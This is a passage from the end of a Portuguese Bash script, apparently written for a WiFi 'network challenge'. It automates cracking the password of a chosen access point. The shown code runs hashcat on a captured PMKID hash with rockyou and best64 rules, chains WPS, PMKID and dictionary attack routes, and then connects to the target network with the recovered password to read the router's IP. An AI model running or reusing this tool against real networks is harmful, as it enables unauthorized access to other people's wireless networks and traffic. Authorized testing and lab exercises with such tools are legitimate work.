    hashcat -m 22000 "$pmkid_hash" "${ROCKYOU}" -r /usr/share/hashcat/rules/best64.rule \
        --potfile-disable -o "${WORKDIR}/pmkid_found.txt" &>>"$LOGFILE"

    if [[ -s "${WORKDIR}/pmkid_found.txt" ]]; then
        SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/pmkid_found.txt" | tail -1)"
        ROTA_USADA="PMKID (hcxdumptool + hashcat)"
        log "Senha encontrada via PMKID: ${SENHA_ENCONTRADA}"
        return 0
    fi

    log "PMKID capturado mas senha não encontrada no dicionário. Rota D sem sucesso final."
    return 1
}

# ============================================================================
# 13. ESCOLHA/EXECUÇÃO AUTOMÁTICA DA ROTA DE ATAQUE
# ============================================================================

executar_ataque() {
    confirmar_autorizacao

    local sabe_parte
    if confirmar "Você conhece parte da senha (prefixo e tamanho)?"; then
        if rota_mascara; then
            return 0
        fi
        log "Rota de máscara não teve sucesso. Seguindo para as próximas rotas."
    fi

    if rota_wps; then
        return 0
    fi
    log "Rota WPS não teve sucesso (ou não aplicável). Seguindo para PMKID."

    if rota_pmkid; then
        return 0
    fi
    log "Rota PMKID não teve sucesso (ou não aplicável). Seguindo para dicionário."

    if rota_dicionario; then
        return 0
    fi

    erro "Nenhuma rota de ataque teve sucesso. Senha não descoberta."
    return 1
}

# ============================================================================
# 14. VOLTAR AO MODO GERENCIADO, CONECTAR E LER O GATEWAY
# ============================================================================

conectar_e_obter_gateway() {
    if [[ -z "${SENHA_ENCONTRADA}" ]]; then
        log "Sem senha descoberta — não é possível conectar automaticamente para ler o gateway."
        return 1
    fi

    log "Restaurando modo gerenciado..."
    airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
    systemctl restart NetworkManager &>>"$LOGFILE"
    sleep 5
    # NM já foi restaurado aqui — zera a flag pra o trap de cleanup não
    # reiniciar o NetworkManager de novo (desconexão breve desnecessária).
    MONITOR_MODE_ATIVO=0

    log "Conectando à rede ${TARGET_ESSID} com a senha descoberta..."
    # Aspas simples preservam caracteres especiais (&, $, :, etc.) na senha
    nmcli dev wifi connect "${TARGET_ESSID}" password "${SENHA_ENCONTRADA}" &>>"$LOGFILE"
    sleep 5

    IP_ROTEADOR="$(ip route | awk '/^default/{print $3; exit}')"
    if [[ -n "${IP_ROTEADOR}" ]]; then
        log "Gateway (IP do roteador) obtido: ${IP_ROTEADOR}"
    else
        erro "Não foi possível obter o gateway após conectar."
    fi
}

# ============================================================================
# 15. RESUMO FINAL
# ============================================================================

imprimir_resumo() {
    local freq_mhz=""
    if [[ "${TARGET_FREQ_LABEL}" == "5 GHz" ]]; then
        freq_mhz="(5${TARGET_CH}00 ~ calcule exato via tabela de canais 5GHz)"
    else
        freq_mhz="($(( 2407 + TARGET_CH * 5 )) MHz aprox.)"
    fi

    {
        echo "================= RESPOSTAS DO DESAFIO ================="
        echo "ESSID .............: ${TARGET_ESSID}"
        echo "Frequência ........: ${TARGET_FREQ_LABEL} ${freq_mhz}"
        echo "Canal .............: ${TARGET_CH}"
        echo "MAC do roteador ...: ${TARGET_BSSID}"
        echo "IP do roteador ....: ${IP_ROTEADOR:-<não obtido>}"
        echo "Senha .............: ${SENHA_ENCONTRADA:-<não descoberta>}"
        echo "Rota usada ........: ${ROTA_USADA:-<nenhuma / somente dados>}"
        echo "==========================================================="
    } | tee "${RESPOSTAS}"

    echo "(salvo em ${RESPOSTAS})"
    log "Resumo final salvo em ${RESPOSTAS}"
}

# ============================================================================
# 16. MENU PRINCIPAL
# ============================================================================

menu_principal() {
    # IMPORTANTE: esta função é chamada diretamente (não via "$(menu_principal)"),
    # porque command substitution captura TODO o stdout da função — se fosse
    # capturada, as linhas do menu abaixo iriam parar dentro da variável em vez
    # de aparecer na tela. Por isso ela escreve o resultado numa variável global
    # (MENU_OPCAO) em vez de usar "echo" como retorno.
    echo
    echo "======================================"
    echo " Auditor WiFi — Desafio de Redes"
    echo "======================================"
    echo "[1] Rodar auditoria completa (dados + senha)"
    echo "[2] Só descobrir dados do AP (sem tentar senha)"
    echo "[3] Sair"
    echo
    read -rp "Escolha: " MENU_OPCAO
}

# ============================================================================
# FLUXO PRINCIPAL
# ============================================================================

restaurar_rede_emergencia() {
    # Botão de emergência: restaura a rede independente de qualquer estado
    # interno (útil se uma execução anterior travou e deixou a placa em
    # modo monitor, ou se o processo morreu sem passar pelo trap de cleanup).
    log "=== Restauração de emergência solicitada (--restaurar) ==="
    local qualquer_mon
    qualquer_mon="$(iw dev | awk '/Interface/{print $2}' | grep -i 'mon' | head -n1)"
    if [[ -n "${qualquer_mon}" ]]; then
        log "Encontrada interface em modo monitor: ${qualquer_mon}. Parando..."
        timeout --kill-after=5 15s airmon-ng stop "${qualquer_mon}" &>>"$LOGFILE"
    else
        log "Nenhuma interface em modo monitor encontrada."
    fi
    log "Religando NetworkManager..."
    timeout --kill-after=5 15s systemctl restart NetworkManager &>>"$LOGFILE" \
        || timeout --kill-after=5 15s service network-manager restart &>>"$LOGFILE"
    sleep 2
    log "Restauração concluída."
    echo ">>> Rede restaurada. Se ainda não voltou, reinicie a máquina."
}

main() {
    if [[ "${EUID}" -ne 0 ]]; then
        erro "Este script precisa rodar como root (sudo ./auditor.sh)."
        exit 1
    fi

    : > "$LOGFILE"
    log "=== Iniciando auditor.sh ==="

    # suporte à flag --restaurar: botão de emergência, roda e sai, sem menu
    for arg in "$@"; do
        if [[ "$arg" == "--restaurar" ]]; then
            restaurar_rede_emergencia
            exit 0
        fi
    done

    # suporte à flag --somente-dados
    for arg in "$@"; do
        [[ "$arg" == "--somente-dados" ]] && SOMENTE_DADOS=1
    done

    local opcao
    if [[ "${SOMENTE_DADOS}" -eq 1 ]]; then
        opcao=2
    else
        MENU_OPCAO=""
        menu_principal
        opcao="${MENU_OPCAO}"
    fi

    case "$opcao" in
        1|2)
            verificar_dependencias
            garantir_wordlist
            detectar_interface
            entrar_modo_monitor
            escanear_e_escolher_alvo

            if [[ "$opcao" == "1" ]]; then
                if executar_ataque; then
                    conectar_e_obter_gateway
                fi
            else
                log "Modo 'somente dados' — pulando etapa de ataque."
            fi

            imprimir_resumo
            ;;
        3)
            log "Saindo sem executar nada."
            exit 0
            ;;
        *)
            erro "Opção inválida."
            exit 1
            ;;
    esac

    log "=== Fim da execução ==="
}

main "$@"
